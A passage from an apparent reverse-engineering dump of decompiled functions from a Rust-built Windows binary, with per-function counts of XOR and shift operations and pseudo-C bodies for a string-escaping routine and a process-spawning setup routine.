\"<>C,\";\n        if ( *(_WORD *)v50 == 21580 )\n          goto LABEL_120;\n        v56 = \">C,\";\n        if ( *(_WORD *)v50 == 21575 )\n          goto LABEL_120;\n        v56 = \"() \";\n        if ( *(_WORD *)v50 == 20556 )\n          goto LABEL_120;\n        v56 = \")\";\n        if ( *(_WORD *)v50 == 20562 )\n          goto LABEL_120;\n        v51 = 2i64;\nLABEL_135:\n        if ( *v50 != 117 )\n          goto LABEL_3;\nLABEL_140:\n        if ( v30[2] <= -65 )\n          sub_14005D310(v30 + 1, v51, 1ui64, v51, (__int64)&off_1400674B8);\n        v61 = v51 - 1;\nLABEL_142:\n        v94 = (char *)v55;\n        v62 = (unsigned __int8 *)(v30 + 2);\n        v63 = v30 + 2;\n        do\n        {\n          if ( v63 == &v30[v61 + 2] )\n          {\nLABEL_156:\n            v68 = 0;\n            if ( !v61 )\n              goto LABEL_3;\n            goto LABEL_157;\n          }\n          v64 = (unsigned __int8)*v63;\n          if ( *v63 < 0 )\n          {\n            v65 = v64 & 0x1F;\n            v66 = v63[1] & 0x3F;\n            if ( (unsigned __int8)v64 <= 0xDFu )\n            {\n              v63 += 2;\n              v64 = v66 | (v65 << 6);\n            }\n            else\n            {\n              v67 = (v66 << 6) | v63[2] & 0x3F;\n              if ( (unsigned __int8)*v63 < 0xF0u )\n              {\n                v63 += 3;\n                v64 = (v65 << 12) | v67;\n              }\n              else\n              {\n                v64 = ((v64 & 7) << 18) | (v67 << 6) | v63[3] & 0x3F;\n                if ( v64 == 1114112 )\n                  goto LABEL_156;\n                v63 += 4;\n              }\n            }\n          }\n          else\n          {\n            ++v63;\n          }\n        }\n        while ( (unsigned int)(v64 - 48) < 0xA || (unsigned int)(v64 - 97) < 6 );\n        v68 = 1;\n        if ( !v61 )\n          goto LABEL_3;\nLABEL_157:\n        v69 = *v62;\n        if ( v69 == 45 )\n        {\n          if ( v61 == 1 )\n            goto LABEL_3;\n        }\n        else if ( v69 == 43 )\n        {\n          if ( !--v61 )\n            goto LABEL_3;\n          v62 = (unsigned __int8 *)(v30 + 3);\n        }\n        v70 = 0i64;\n        v71 = 0;\n        if ( v61 < 9 )\n        {\n          do\n          {\n            v77 = v62[v70];\n            v78 = v77 - 48;\n            if ( (unsigned int)(v77 - 48) >= 0xA )\n            {\n              v79 = (v77 | 0x20) - 97;\n              v25 = __CFADD__(v79, 10);\n              v80 = v79 + 10;\n              if ( v25 )\n                v80 = -1;\n              v78 = v80;\n              if ( v80 > 0xF )\n                goto LABEL_3;\n            }\n            v71 = v78 | (16 * v71);\n            ++v70;\n          }\n          while ( v61 != v70 );\nLABEL_169:\n          if ( (v71 ^ 0xD800) - 1114112 < 0xFFEF0800 )\n            v71 = 1114112;\n          if ( (v71 == 1114112) | (unsigned __int8)v68 )\n            goto LABEL_3;\n          v86 = v71;\n          if ( v71 << 11 >= 0x88050000 )\n            sub_14005CD40(1i64, 1i64, (__int64)&off_140063E18);\n          if ( v71 < 0x20 || v71 - 127 < 0x21 )\n            goto LABEL_3;\n          v76 = sub_14000A9B0(&v86, v87);\n          v16 = v94;\n          if ( v76 )\n            return 1;\n          continue;\n        }\n        while ( 1 )\n        {\n          v72 = v62[v70];\n          v73 = v72 - 48;\n          if ( (unsigned int)(v72 - 48) >= 0xA )\n          {\n            v74 = (v72 | 0x20) - 97;\n            v25 = __CFADD__(v74, 10);\n            v75 = v74 + 10;\n            if ( v25 )\n              v75 = -1;\n            v73 = v75;\n            if ( v75 > 0xF )\n              break;\n          }\n          if ( v71 > 0xFFFFFFF )\n            break;\n          v71 = v73 | (16 * v71);\n          if ( v61 == ++v70 )\n            goto LABEL_169;\n        }\nLABEL_3:\n        v8 = (*(__int64 (__fastcall **)(__int64, char *, unsigned __int64))(v29 + 24))(v28, v30, v31);\n        v2 = v87;\n        v6 = v95;\n        v5 = v85;\n        v7 = v88;\n        if ( v8 )\n          return 1;\n        goto LABEL_4;\n      }\n      if ( v32 != 46 )\n        break;\n      v33 = v16 + 1;\n      if ( v17 < 2 )\n      {\n        v49 = (*(__int64 (__fastcall **)(__int64, char *, __int64))(v29 + 24))(v28, \".\\\\\", 1i64);\n        v16 = v30 + 1;\n        v17 = 0i64;\n        if ( v49 )\n          return 1;\n        continue;\n      }\n      v34 = *v33;\n      if ( *v33 <= -65 )\n      {\n        v82 = &off_140067420;\n        goto LABEL_197;\n      }\n      v35 = (unsigned __int8)v34;\n      if ( v34 < 0 )\n      {\n        v36 = v34 & 0x1F;\n        v37 = v16[2] & 0x3F;\n        if ( (unsigned __int8)v34 <= 0xDFu )\n        {\n          v35 = v37 | (v36 << 6);\n        }\n        else\n        {\n          v38 = (v37 << 6) | v16[3] & 0x3F;\n          if ( (unsigned __int8)v34 < 0xF0u )\n            v35 = v38 | (v36 << 12);\n          else\n            v35 = (v38 << 6) | v16[4] & 0x3F | ((v34 & 7) << 18);\n        }\n      }\n      v59 = *(unsigned __int8 (__fastcall **)(__int64, unsigned __int16 *, __int64))(v29 + 24);\n      if ( v35 == 46 )\n      {\n        if ( v59(v28, word_140067400, 2i64) )\n          return 1;\n        if ( v17 < 3 )\n        {\n          v17 = 0i64;\n        }\n        else\n        {\n          if ( v30[2] <= -65 )\n            sub_14005D310(v30, v17, 2ui64, v17, (__int64)&off_140067450);\n          v17 -= 2i64;\n        }\n        v16 = v30 + 2;\n      }\n      else\n      {\n        v60 = v16 + 1;\n        if ( v59(v28, (unsigned __int16 *)\".\\\\\", 1i64) )\n          return 1;\n        --v17;\n        v16 = v30 + 1;\n        if ( *v60 <= -65 )\n        {\n          v82 = &off_140067438;\n          goto LABEL_197;\n        }\n      }\n    }\n    v39 = &v16[v17];\n    v40 = 0i64;\n    v41 = v16;\n    while ( 1 )\n    {\n      if ( v41 == v39 )\n        goto LABEL_3;\n      v43 = v40;\n      v44 = (unsigned __int8)*v41;\n      if ( *v41 >= 0 )\n      {\n        v42 = v41 + 1;\n        if ( v44 == 36 )\n          goto LABEL_79;\n        goto LABEL_68;\n      }\n      v45 = v44 & 0x1F;\n      v46 = v41[1] & 0x3F;\n      if ( (unsigned __int8)v44 <= 0xDFu )\n      {\n        v42 = v41 + 2;\n        v44 = v46 | (v45 << 6);\n        if ( v44 == 36 )\n          goto LABEL_79;\n        goto LABEL_68;\n      }\n      v47 = (v46 << 6) | v41[2] & 0x3F;\n      if ( (unsigned __int8)*v41 >= 0xF0u )\n        break;\n      v42 = v41 + 3;\n      v44 = (v45 << 12) | v47;\n      if ( v44 == 36 )\n        goto LABEL_79;\nLABEL_68:\n      v40 = (unsigned __int64)&v42[v43 - (_QWORD)v41];\n      v41 = v42;\n      if ( v44 == 46 )\n        goto LABEL_79;\n    }\n    v44 = ((v44 & 7) << 18) | (v47 << 6) | v41[3] & 0x3F;\n    if ( v44 == 1114112 )\n      goto LABEL_3;\n    v42 = v41 + 4;\n    if ( v44 != 36 )\n      goto LABEL_68;\nLABEL_79:\n    if ( v43 )\n    {\n      v17 -= v43;\n      if ( v31 > v43 )\n      {\n        if ( v30[v43] <= -65 )\n          goto LABEL_191;\n        if ( (*(unsigned __int8 (__fastcall **)(__int64, char *, unsigned __int64, char *))(v29 + 24))(\n               v28,\n               v30,\n               v43,\n               v42) )\n        {\n          return 1;\n        }\n        if ( v30[v43] <= -65 )\n          sub_14005D310(v30, v31, v43, v31, (__int64)&off_1400674D0);\nLABEL_92:\n        v16 = &v30[v43];\n        continue;\n      }\n      if ( v31 != v43 )\nLABEL_191:\n        sub_14005D310(v30, v31, 0i64, v43, (__int64)&off_1400674E8);\n      if ( !(*(unsigned __int8 (__fastcall **)(__int64, char *, unsigned __int64, char *))(v29 + 24))(\n              v28,\n              v30,\n              v43,\n              v42) )\n        goto LABEL_92;\n    }\n    else if ( !(*(unsigned __int8 (__fastcall **)(__int64, char *, _QWORD, char *))(v29 + 24))(v28, v30, 0i64, v42) )\n    {\n      goto LABEL_92;\n    }\n    return 1;\n  }\n}\n// 140020EE3: conditional instruction was optimized away because rdx.8>=9u\n// 14005D130: using guessed type void __fastcall __noreturn sub_14005D130(_DWORD, _DWORD, _DWORD, _DWORD, __int64);\n// 140063E18: using guessed type void *off_140063E18;\n// 1400672C8: using guessed type __int64 (__fastcall *off_1400672C8)();\n// 1400673A0: using guessed type char *off_1400673A0;\n// 1400673B8: using guessed type char *off_1400673B8;\n// 1400673D0: using guessed type char *off_1400673D0;\n// 1400673E8: using guessed type char *off_1400673E8;\n// 140067400: using guessed type unsigned __int16 word_140067400[4];\n// 140067408: using guessed type char *off_140067408;\n// 140067420: using guessed type char *off_140067420;\n// 140067438: using guessed type char *off_140067438;\n// 140067450: using guessed type char *off_140067450;\n// 140067468: using guessed type char *off_140067468;\n// 140067480: using guessed type char *off_140067480;\n// 140067498: using guessed type char *off_140067498;\n// 1400674B8: using guessed type char *off_1400674B8;\n// 1400674D0: using guessed type char *off_1400674D0;\n// 1400674E8: using guessed type char *off_1400674E8;\n// 140067500: using guessed type char *off_140067500;\n// 140067518: using guessed type char *off_140067518;\n\n"
    },
    {
        "Function": "sub_14003AE90",
        "Total XOR and shift operations": 45,
        "XOR operations": 1,
        "Shift operations": 44,
        "Operation percentage": "1.71%",
        "Function Body": "\nvoid __fastcall sub_14003AE90(__int64 a1, __int64 a2)\n{\n  unsigned __int64 lpDesktop; // rdi\n  _QWORD *v3; // r15\n  char *v4; // rsi\n  char v5; // al\n  __int64 v6; // r13\n  WCHAR *EnvironmentStringsW; // rax\n  WCHAR *v8; // r15\n  __int64 v9; // rcx\n  unsigned __int64 v10; // r13\n  unsigned __int64 v11; // r12\n  __int64 v12; // rax\n  bool v13; // zf\n  __int64 v14; // rsi\n  unsigned __int64 v15; // r14\n  __int64 v16; // rax\n  unsigned __int64 v17; // r8\n  unsigned __int64 v18; // rbx\n  __int64 v19; // r14\n  unsigned __int64 v20; // rdx\n  unsigned __int64 v21; // rcx\n  __int64 v22; // r13\n  unsigned __int64 v23; // r15\n  __int64 v24; // rcx\n  __int64 v25; // rcx\n  __int64 v26; // r8\n  __int64 v27; // rcx\n  __int64 v28; // r12\n  __int64 v29; // r15\n  unsigned __int64 v30; // r13\n  const WCHAR *v31; // r9\n  __int64 v32; // rax\n  LPWSTR v33; // r12\n  const void *v34; // rsi\n  __int64 v35; // rdi\n  __int64 v36; // rbx\n  __int8 v37; // al\n  const WCHAR *v38; // rdx\n  WCHAR *v39; // rdi\n  __int64 v40; // rbx\n  size_t v41; // r12\n  __int64 v42; // rbx\n  const WCHAR *v43; // rsi\n  char *v44; // rax\n  __int64 v45; // rsi\n  unsigned __int64 v46; // rax\n  __int64 v47; // rcx\n  __int64 v48; // r9\n  __int64 v49; // rcx\n  __int64 v50; // rax\n  __int64 v51; // rax\n  __int64 v52; // rax\n  __int64 v53; // rax\n  __int64 v54; // rax\n  __int64 v55; // rax\n  __int64 v56; // rax\n  __int64 v57; // rcx\n  __m128i v58; // xmm0\n  _QWORD *hStdOutput; // rdx\n  unsigned __int64 v60; // rax\n  _WORD *v61; // rcx\n  __int64 v62; // r13\n  const void *v63; // rsi\n  __int64 v64; // rbx\n  __int8 v65; // al\n  char *hStdError; // r8\n  __int64 v67; // rdx\n  __int64 v68; // rax\n  __int128 v69; // xmm0\n  __int128 v70; // xmm1\n  __int128 v71; // xmm0\n  __int128 v72; // xmm1\n  __int128 v73; // xmm0\n  __int128 v74; // xmm1\n  __m128i si128; // xmm0\n  __m128i v76; // xmm0\n  __int128 v77; // kr00_16\n  __int64 v78; // rbx\n  char *v79; // rax\n  __m128i v80; // xmm0\n  int v81; // r14d\n  unsigned __int16 *v82; // rax\n  unsigned __int16 *v83; // rcx\n  __int64 v84; // r12\n  unsigned __int64 *v85; // r15\n  unsigned __int16 *v86; // rbx\n  int v87; // eax\n  WCHAR *v88; // r14\n  char **v89; // rbx\n  _DWORD *v90; // rcx\n  bool (__fastcall *v91)(char); // rdx\n  char v92; // si\n  __int64 v93; // rax\n  __int64 v94; // rax\n  __int64 v95; // rcx\n  char *v96; // r15\n  bool v97; // al\n  WCHAR *v98; // rcx\n  int v99; // edx\n  __int16 v100; // r8\n  char *v101; // rax\n  __int16 v102; // cx\n  unsigned int v103; // edx\n  int v104; // r8d\n  int v105; // r10d\n  int v106; // edx\n  char v107; // r9\n  unsigned __int64 v108; // rsi\n  char *v109; // rax\n  __int64 v110; // rdi\n  __m128i v111; // xmm0\n  _WORD *v112; // rax\n  unsigned __int64 v113; // rdx\n  __int64 v114; // rcx\n  unsigned __int64 v115; // r8\n  unsigned __int64 v116; // rcx\n  unsigned __int64 v117; // rax\n  WCHAR *v118; // rcx\n  bool v119; // r8\n  __int8 lpTitle; // al\n  unsigned __int64 v121; // rsi\n  _BYTE *v122; // rax\n  unsigned __int64 v123; // rdx\n  void *v124; // r15\n  __m128i v125; // xmm0\n  void *v126; // rsi\n  __int64 v127; // r13\n  __m128i v128; // xmm6\n  __int64 v129; // r8\n  unsigned __int64 v130; // rbx\n  __int64 v131; // r13\n  WCHAR *p_lpString1; // r12\n  unsigned __int64 v133; // r15\n  unsigned __int64 v134; // r8\n  UINT SystemDirectoryW; // esi\n  unsigned __int64 v136; // r15\n  unsigned __int64 v137; // rax\n  char *v138; // r13\n  _QWORD *v139; // rsi\n  __int64 v140; // rbx\n  char v141; // di\n  __int64 v142; // rcx\n  __int64 v143; // rdx\n  _QWORD *v144; // r15\n  __int64 v145; // rdx\n  char **v146; // rbx\n  WCHAR *v147; // rax\n  __int64 v148; // rdx\n  int v149; // r15d\n  int v150; // r15d\n  __int64 v151; // rsi\n  __int64 v152; // rbx\n  __int64 v153; // r12\n  __int64 v154; // rax\n  char v155; // si\n  __int64 v156; // r14\n  __int64 v157; // rcx\n  __int128 v158; // rdi\n  char *v159; // rbx\n  __int64 v160; // r14\n  WCHAR *v161; // r15\n  unsigned __int64 v162; // r12\n  unsigned __int64 v163; // r13\n  unsigned __int64 v164; // rsi\n  UINT v165; // edi\n  unsigned __int64 v166; // r13\n  char v167; // si\n  __int64 v168; // r12\n  unsigned __int64 v169; // rdx\n  __int8 v170; // si\n  unsigned __int64 v171; // rdi\n  char *v172; // rcx\n  __int64 v173; // rax\n  __int64 v174; // r8\n  char v175; // dl\n  __int64 v176; // r9\n  __int32 v177; // r10d\n  unsigned __int8 *v178; // r8\n  __int16 v179; // bx\n  char *v180; // r9\n  __int16 v181; // r10\n  unsigned int v182; // r11d\n  int v183; // ebx\n  int v184; // r13d\n  int v185; // r11d\n  unsigned __int8 v186; // r14\n  _WORD *v187; // rbx\n  LPWCH v188; // r14\n  __int64 v189; // r12\n  __int128 v190; // kr50_16\n  __int16 v191; // r10\n  char *v192; // rdx\n  __int16 v193; // r8\n  unsigned int v194; // r9d\n  int v195; // r10d\n  int v196; // ebx\n  int v197; // r9d\n  char v198; // r11\n  __int64 v199; // r12\n  LPWCH v200; // rsi\n  unsigned __int64 v201; // rdi\n  void *v202; // r13\n  WCHAR *v203; // rcx\n  __int16 v204; // r10\n  char *v205; // rdx\n  __int16 v206; // r8\n  unsigned int v207; // r9d\n  int v208; // r10d\n  int v209; // esi\n  int v210; // r9d\n  char v211; // r11\n  __int64 v212; // rax\n  __int64 v213; // r8\n  unsigned __int64 v214; // rbx\n  __int64 v215; // r13\n  WCHAR *v216; // r12\n  unsigned __int64 v217; // r15\n  unsigned __int64 v218; // r8\n  UINT WindowsDirectoryW; // esi\n  unsigned __int64 v220; // r15\n  char v221; // si\n  __int64 v222; // rcx\n  __int64 v223; // rax\n  __m128i v224; // xmm0\n  void *v225; // r13\n  __int64 v226; // rax\n  __int64 v227; // rdx\n  bool v228; // al\n  bool v229; // r12\n  char *v230; // rbx\n  __int64 v231; // rdi\n  char *v232; // r14\n  __int64 v233; // rsi\n  __int64 v234; // rcx\n  void *v235; // rdx\n  __int64 v236; // rax\n  bool v237; // si\n  __int64 v238; // rcx\n  __int64 v239; // rax\n  void *v240; // rdx\n  void *lpEnvironment; // rdi\n  __int64 v242; // rax\n  HANDLE v243; // r12\n  SIZE_T v244; // r14\n  char *v245; // rax\n  __int64 v246; // rcx\n  __int64 v247; // rax\n  void *v248; // rdx\n  void *v249; // r14\n  __int64 v250; // rax\n  HANDLE v251; // rbx\n  char *v252; // r13\n  int v253; // eax\n  __int64 v254; // r12\n  int v255; // r15d\n  unsigned int v256; // r14d\n  unsigned __int64 v257; // r8\n  int v258; // ecx\n  int v259; // r9d\n  int v260; // edx\n  __int64 v261; // rax\n  unsigned __int64 v262; // rbx\n  __int64 v263; // rdi\n  __int64 v264; // rdi\n  _QWORD *v265; // rsi\n  char *v266; // rax\n  char *v267; // r12\n  __int64 v268; // rdi\n  __int16 v269; // r13\n  int v270; // ecx\n  int v271; // r9d\n  int v272; // edx\n  LPWSTR v273; // rdi\n  __int64 v274; // r12\n  __int64 v275; // rcx\n  __int64 v276; // rbx\n  __int64 v277; // rdi\n  char *v278; // rcx\n  void **v279; // r15\n  unsigned __int64 v280; // r14\n  _WORD *v281; // rax\n  WCHAR *v282; // r13\n  LPWSTR v283; // r15\n  __int128 v284; // xmm0\n  __int128 v285; // xmm1\n  __int64 v286; // rax\n  LPWCH v287; // rdi\n  unsigned __int8 v288; // si\n  __int16 v289; // cx\n  __int64 v290; // r15\n  __int64 v291; // rdi\n  _QWORD *v292; // r12\n  __int64 v293; // rdx\n  char v294; // r14\n  __int64 v295; // r15\n  __int64 v296; // r13\n  __int64 v297; // rdi\n  __int64 v298; // rax\n  char **v299; // rax\n  __int64 v300; // rax\n  __int64 v301; // rdx\n  int v302; // ecx\n  __int64 v303; // rax\n  __int64 v304; // rcx\n  __int64 v305; // rax\n  __int64 v306; // rax\n  DWORD dwCreationFlags; // [rsp+80h] [rbp-58h]\n  struct _STARTUPINFOW lpString1; // [rsp+A8h] [rbp-30h] BYREF\n  unsigned __int64 v309; // [rsp+110h] [rbp+38h]\n  __m128i v310; // [rsp+4A8h] [rbp+3D0h] BYREF\n  __int64 v311; // [rsp+4B8h] [rbp+3E0h]\n  __m128i v312; // [rsp+4C0h] [rbp+3E8h] BYREF\n  __int64 v313; // [rsp+4D0h] [rbp+3F8h]\n  __int128 v314; // [rsp+4D8h] [rbp+400h]\n  void *v315; // [rsp+4E8h] [rbp+410h]\n  HANDLE hObject; // [rsp+4F0h] [rbp+418h]\n  LPCWSTR lpApplicationName[2]; // [rsp+4F8h] [rbp+420h] BYREF\n  __int64 v318; // [rsp+508h] [rbp+430h]\n  __m256i v319; // [rsp+518h] [rbp+440h] BYREF\n  LPWSTR lpCommandLine[2]; // [rsp+540h] [rbp+468h] BYREF\n  __int64 v321; // [rsp+550h] [rbp+478h]\n  __int64 v322; // [rsp+558h] [rbp+480h]\n  LPCWSTR lpCurrentDirectory; // [rsp+560h] [rbp+488h]\n  __m256i v324; // [rsp+568h] [rbp+490h] BYREF\n  __int128 v325; // [rsp+588h] [rbp+4B0h]\n  _BYTE v326[40]; // [rsp+598h] [rbp+4C0h]\n  LPVOID v327; // [rsp+5C8h] [rbp+4F0h]\n  __int64 v328; // [rsp+5D0h] [rbp+4F8h]\n  __m128i ProcessInformation; // [rsp+5D8h] [rbp+500h] BYREF\n  __int128 ProcessInformation_16; // [rsp+5E8h] [rbp+510h]\n  __int64 v331; // [rsp+600h] [rbp+528h]\n  __m256i v332; // [rsp+608h] [rbp+530h] BYREF\n  HANDLE v333; // [rsp+630h] [rbp+558h]\n  __m256i v334; // [rsp+638h] [rbp+560h] BYREF\n  HANDLE v335[2]; // [rsp+658h] [rbp+580h] BYREF\n  _BYTE v336[40]; // [rsp+668h] [rbp+590h]\n  LPWCH penv; // [rsp+690h] [rbp+5B8h]\n  char v338; // [rsp+69Dh] [rbp+5C5h]\n  char v339; // [rsp+69Eh] [rbp+5C6h]\n  char v340; // [rsp+69Fh] [rbp+5C7h]\n  unsigned __int64 v341; // [rsp+6A0h] [rbp+5C8h]\n  char v342; // [rsp+6AFh] [rbp+5D7h]\n  void *Src; // [rsp+6B0h] [rbp+5D8h]\n  char v344; // [rsp+6BAh] [rbp+5E2h]\n  char v345; // [rsp+6BBh] [rbp+5E3h]\n  char v346; // [rsp+6BCh] [rbp+5E4h]\n  char v347; // [rsp+6BFh] [rbp+5E7h]\n  __int64 v348; // [rsp+6C0h] [rbp+5E8h]\n\n  v348 = -2i64;\n  v3 = (_QWORD *)a2;\n  v328 = a1;\n  v4 = *(char **)(a2 + 96);\n  v5 = *(_BYTE *)(a2 + 104);\n  LOBYTE(v327) = v5 == 0 && v4 == 0i64;\n  v333 = (HANDLE)a2;\n  if ( (_BYTE)v327 )\n  {\n    v311 = 0i64;\n    v6 = 0i64;\n    goto LABEL_126;\n  }\n  lpCommandLine[0] = 0i64;\n  v321 = 0i64;\n  if ( !v5 )\n  {\n    EnvironmentStringsW = GetEnvironmentStringsW();\n    if ( !EnvironmentStringsW )\n    {\n      LODWORD(v306) = GetLastError();\n      v324.m256i_i64[0] = (v306 << 32) | 2;\n      v334.m256i_i64[0] = (__int64)&v324;\n      v334.m256i_i64[1] = (__int64)sub_140032000;\n      *(_QWORD *)&lpString1.cb = &off_14006B410;\n      lpString1.lpReserved = (LPWSTR)1;\n      *(_QWORD *)&lpString1.dwX = 0i64;\n      lpString1.lpDesktop = (LPWSTR)&v334;\n      lpString1.lpTitle = (LPWSTR)1;\n      sub_14005CD00((__int64)&lpString1, (__int64)&off_14006B420);\n    }\n    Src = v4;\n    penv = EnvironmentStringsW;\n    v8 = EnvironmentStringsW;\nLABEL_6:\n    while ( *v8 )\n    {\n      lpDesktop = (unsigned __int64)v8;\n      v9 = -2i64;\n      v10 = 0i64;\n      do\n      {\n        v11 = v10;\n        v12 = v9;\n        ++v10;\n        v13 = *v8++ == 0;\n        v9 += 2i64;\n      }\n      while ( !v13 );\n      if ( v11 != 1 )\n      {\n        if ( !v11 )\n          sub_14005CDC0(1i64, 0i64, (__int64)&off_14006B3A0);\n        v14 = -4i64;\n        v15 = 0i64;\n        while ( *(_WORD *)(lpDesktop + 2 * v15 + 2) != 61 )\n        {\n          ++v15;\n          v14 -= 2i64;\n          v12 -= 2i64;\n          if ( !v12 )\n            goto LABEL_6;\n        }\n        if ( v15 >= v11 )\n          sub_14005CE40(v15 + 1, v11, (__int64)&off_14006B3B8);\n        sub_14002F8C0((__int128 *)ProcessInformation.m128i_i8, (unsigned __int16 *)lpDesktop, v15 + 1);\n        if ( v11 < v15 + 2 )\n          sub_14005CDC0(v15 + 2, v11, (__int64)&off_14006B3D0);\n        sub_14002F8C0((__int128 *)v324.m256i_i8, (unsigned __int16 *)(lpDesktop - v14), v10 - v15 - 3);\n        *(_OWORD *)&lpString1.lpDesktop = ProcessInformation_16;\n        *(__m128i *)&lpString1.cb = ProcessInformation;\n        *(_QWORD *)&lpString1.dwXCountChars = v324.m256i_i64[2];\n        *(_OWORD *)&lpString1.dwX = *(_OWORD *)v324.m256i_i8;\n        lpDesktop = v324.m256i_u8[24];\n        LODWORD(lpApplicationName[0]) = *(__int32 *)((char *)&v324.m256i_i32[6] + 1);\n        *(_DWORD *)((char *)lpApplicationName + 3) = v324.m256i_i32[7];\n        *(_QWORD *)v336 = v324.m256i_i64[2];\n        *(_OWORD *)v335 = *(_OWORD *)v324.m256i_i8;\n        *(_OWORD *)&v334.m256i_u64[2] = ProcessInformation_16;\n        *(__m128i *)v334.m256i_i8 = ProcessInformation;\n        if ( v324.m256i_i8[24] == 2 )\n          break;\n        v319 = v334;\n        v332.m256i_i64[2] = *(_QWORD *)v336;\n        *(__m128i *)v332.m256i_i8 = _mm_loadu_si128((const __m128i *)v335);\n        v332.m256i_i8[24] = v324.m256i_i8[24];\n        v332.m256i_i32[7] = *(_DWORD *)((char *)lpApplicationName + 3);\n        *(__int32 *)((char *)&v332.m256i_i32[6] + 1) = (__int32)lpApplicationName[0];\n        v324.m256i_i64[0] = v334.m256i_i64[0];\n        v324.m256i_i64[1] = v334.m256i_i64[0] + v334.m256i_i64[2];\n        v324.m256i_i16[8] = 0;\n        sub_14003F6F0((__int64)&ProcessInformation, (char **)&v324);\n        *(__m256i *)&lpString1.lpTitle = v334;\n        *(__m128i *)&lpString1.cb = ProcessInformation;\n        lpString1.lpDesktop = (LPWSTR)ProcessInformation_16;\n        v324.m256i_i64[2] = *(_QWORD *)v336;\n        *(__m128i *)v324.m256i_i8 = _mm_loadu_si128((const __m128i *)v335);\n        v324.m256i_i8[24] = lpDesktop;\n        v324.m256i_i32[7] = *(_DWORD *)((char *)lpApplicationName + 3);\n        *(__int32 *)((char *)&v324.m256i_i32[6] + 1) = (__int32)lpApplicationName[0];\n        v340 = 0;\n        sub_14003F910((__int64)&ProcessInformation, (__int64 *)lpCommandLine, &lpString1, &v324);\n        if ( BYTE8(ProcessInformation_16) != 2 && ProcessInformation.m128i_i64[1] )\n          sub_140006340((void *)ProcessInformation.m128i_i64[0], 1ui64);\n      }\n    }\n    FreeEnvironmentStringsW(penv);\n    v3 = v333;\n    v4 = (char *)Src;\n  }\n  v16 = v3[10];\n  v17 = v3[11];\n  v18 = v16 != 0;\n  if ( !v16 )\n    v4 = 0i64;\n  v19 = 0i64;\n  while ( v4 )\n  {\n    if ( !v18 || v19 )\n    {\n      if ( !v18 )\n        sub_14005CEC0(\n          (__int64)\"called `Option::unwrap()` on a `None` valueC:\\\\Users\\\\root\\\\.cargo\\\\registry\\\\src\\\\index.crates.io-6f\"\n                   \"17d22bba15001f\\\\winapi-util-0.1.5\\\\src\\\\win.rs\",\n          43i64,\n          (__int64)&off_140068AF0);\n      goto LABEL_41;\n    }\n    v18 = 1i64;\n    if ( v17 )\n    {\n      v20 = v17 & 7;\n      if ( (v17 & 7) != 0 )\n      {\n        v21 = v17 & 0xFFFFFFFFFFFFFFF8ui64;\n        v19 = v16;\n        do\n        {\n          v19 = *(_QWORD *)(v19 + 984);\n          --v20;\n        }\n        while ( v20 );\n        if ( v17 < 8 )\n          goto LABEL_40;\n        do\n        {\nLABEL_39:\n          v19 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(v19 + 984)\n                                                                                                  + 984i64)\n                                                                                      + 984i64)\n                                                                          + 984i64)\n                                                              + 984i64)\n                                                  + 984i64)\n                                      + 984i64)\n                          + 984i64);\n          v21 -= 8i64;\n        }\n        while ( v21 );\n        goto LABEL_40;\n      }\n      v19 = v16;\n      v21 = v17;\n      if ( v17 >= 8 )\n        goto LABEL_39;\n    }\n    else\n    {\n      v19 = v16;\n    }\nLABEL_40:\n    v17 = 0i64;\n    v16 = 0i64;\nLABEL_41:\n    v22 = v19;\n    v23 = v17;\n    if ( v17 >= *(unsigned __int16 *)(v19 + 978) )\n    {\n      do\n      {\n        v24 = *(_QWORD *)(v22 + 352);\n        if ( !v24 )\n          sub_14005CEC0(\n            (__int64)\"called `Option::unwrap()` on a `None` valueC:\\\\Users\\\\root\\\\.cargo\\\\registry\\\\src\\\\index.crates.io-\"\n                     \"6f17d22bba15001f\\\\winapi-util-0.1.5\\\\src\\\\win.rs\",\n            43i64,\n            (__int64)&off_140069640);\n        v23 = *(unsigned __int16 *)(v22 + 976);\n        ++v16;\n        v22 = *(_QWORD *)(v22 + 352);\n      }\n      while ( (unsigned __int16)v23 >= *(_WORD *)(v24 + 978) );\n    }\n    if ( v16 )\n    {\n      v19 = *(_QWORD *)(v22 + 8 * v23 + 992);\n      v25 = v16 - 1;\n      if ( v16 != 1 )\n      {\n        v26 = v25 & 7;\n        if ( (v25 & 7) != 0 )\n        {\n          v27 = v25 & 7;\n          do\n          {\n            v19 = *(_QWORD *)(v19 + 984);\n            --v27;\n          }\n          while ( v27 );\n          v25 = ~v26 + v16;\n        }\n        if ( (unsigned __int64)(v16 - 2) >= 7 )\n        {\n          do\n          {\n            v19 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(v19 + 984) + 984i64)\n                                                                                        + 984i64)\n                                                                            + 984i64)\n                                                                + 984i64)\n                                                    + 984i64)\n                                        + 984i64)\n                            + 984i64);\n            v25 -= 8i64;\n          }\n          while ( v25 );\n        }\n      }\n      v17 = 0i64;\n    }\n    else\n    {\n      v17 = v23 + 1;\n      v19 = v22;\n    }\n    --v4;\n    v28 = 56 * v23 + v22 + 360;\n    v29 = 32 * v23;\n    if ( *(_BYTE *)(v22 + v29 + 24) == 2 )\n    {\n      lpDesktop = (unsigned __int64)lpCommandLine[0];\n      v16 = 0i64;\n      v3 = v333;\n      if ( lpCommandLine[0] )\n      {\n        v30 = v17;\n        v31 = *(const WCHAR **)v28;\n        v32 = *(_QWORD *)(v28 + 16);\n        v33 = lpCommandLine[1];\n        sub_1400410A0((__int64)&ProcessInformation, (__int64)lpCommandLine[0], (__int64)lpCommandLine[1], v31, v32);\n        if ( ProcessInformation.m128i_i64[0] )\n        {\n          v16 = 0i64;\n          v17 = v30;\n        }\n        else\n        {\n          LOBYTE(lpApplicationName[0]) = 0;\n          if ( (_QWORD)ProcessInformation_16 )\n          {\n            v46 = *(_QWORD *)(ProcessInformation.m128i_i64[1] + 8i64 * *((_QWORD *)&ProcessInformation_16 + 1) + 984);\n            v47 = ProcessInformation_16 - 1;\n            if ( (_QWORD)ProcessInformation_16 != 1i64 )\n            {\n              v48 = v47 & 7;\n              if ( (v47 & 7) != 0 )\n              {\n                v49 = v47 & 7;\n                do\n                {\n                  v46 = *(_QWORD *)(v46 + 8i64 * *(unsigned __int16 *)(v46 + 978) + 984);\n                  --v49;\n                }\n                while ( v49 );\n                v47 = ~v48 + ProcessInformation_16;\n              }\n              if ( (unsigned __int64)(ProcessInformation_16 - 